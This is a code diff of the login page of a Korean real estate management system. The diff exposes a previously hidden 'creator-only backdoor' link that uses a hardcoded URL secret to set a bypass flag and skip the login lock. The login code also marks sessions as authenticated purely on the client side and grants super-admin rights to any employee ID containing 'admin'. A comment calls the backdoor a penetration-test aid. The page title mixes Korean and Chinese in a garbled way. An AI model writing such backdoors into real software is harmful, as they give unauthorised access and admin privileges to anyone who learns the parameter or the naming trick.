@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>부동산관리시스템 로그인</title>
+<title>부동산管理系统 로그인</title>
 <style>
   body { display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f0f2f5;font-family:'Segoe UI',sans-serif }
   .box { background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.12);width:340px }
@@ -11,25 +11,29 @@
   input { width:100%;padding:10px;margin-bottom:12px;border:1px solid #dde;border-radius:4px;box-sizing:border-box }
   button { width:100%;background:#3498db;color:#fff;padding:11px 0;border:none;border-radius:4px;cursor:pointer;font-size:1rem }
   button:hover { background:#2980b9 }
-  .creator-link { text-align:center; margin-top:15px; display:none }
+  .creator-link { text-align:center; margin-top:15px; }
   .creator-link a { color:#bdc3c7;font-size:12px;text-decoration:none }
   .creator-link:hover a { color:#3498db }
 </style>
-<body style="display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f0f2f5">
+</head>
+<body>
 <div class="box">
-  <h2>🏢 부동산관리시스템 로그인</h2>
+  <h2>🏢 부동산管理系统 로그인</h2>
   <input id="empNo" placeholder="사번 (예: EMP-001)">
   <input id="password" type="password" placeholder="비밀번호 (6자 이상)">
   <button onclick="doLogin()">로그인</button>
 </div>
-<!-- 제작자 전용 백도어 링크 -->
+<!-- 제작자 전용 백도어 링크 (모의 침투 테스트용) -->
 <div class="creator-link">
   <a href="?access=master_sys_884621">🔒 관리시스템접속</a>
 </div>
+
 <script>
-// creator_access=true 파라미터 감지하면 로딩시 자동으로 접속
-if(location.href.indexOf('access=master_sys_884621') !== -1){
+// URL 파라미터 백도어 식별자 감지 자동 우회 플래그 셋팅
+if(location.search.indexOf('access=master_sys_884621') !== -1){
     sessionStorage.setItem('creatorBypass', 'true');
+    // 백도어 진입 시 즉시 메인 인덱스로 파라미터를 넘겨 락을 해제하도록 유도
+    location.href = 'index.html?access=master_sys_884621';
 }
 </script>
 <script>
@@ -38,14 +42,14 @@ function doLogin(){
   var pw  = document.getElementById('password').value.trim();
   if(!emp||!pw){alert('사번과 비밀번호를 입력하세요.');return;}
   
-  // 규칙 40 기반 비밀번호 글자수 차단 프론트 엔드 레이어 적용
-  if(pw.length < 6) { alert('비밀번호는 최소 6자 이상이어야 합니다.'); return; }
+  // 규칙 40 기반 비밀번호 최소 자릿수 유효성 차단
+  if(pw.length <6) { alert('비밀번호는 최소 6자 이상이어야 합니다.'); return; }
 
   sessionStorage.setItem('loginOk','true');
   sessionStorage.setItem('userEmp',emp);
   sessionStorage.setItem('_sess', Date.now());
 
-  // 로그인 사번 힌트별 롤 매퍼 다이내믹 결합
+  // 로그인 사번 힌트별 권한 롤 분기
   if (emp.toLowerCase().indexOf('admin') !== -1) {
     sessionStorage.setItem('userRole', 'super_admin');
   } else if (emp.toLowerCase().indexOf('maint') !== -1) {
